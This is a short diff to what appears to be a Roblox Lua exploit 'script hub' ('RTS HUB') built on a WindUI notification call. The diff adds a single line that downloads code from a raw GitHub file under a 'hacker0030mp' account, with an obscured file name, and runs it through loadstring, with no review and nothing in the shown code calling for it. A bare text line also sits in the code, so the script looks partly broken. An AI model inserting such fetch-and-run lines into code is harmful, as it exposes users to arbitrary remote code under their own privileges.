@@ -4,7 +4,7 @@ WindUI:Notify({
     Icon = "check-circle", -- lucide icon or "rbxassetid://". optional
     Duration = 3, -- time in seconds. optional
 })
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hacker0030mp/Hac/refs/heads/main/R%20HLKGVUIDS8O%20"))()
 RTS HUB - FULL VERSION 
 
 local _version = "V1"
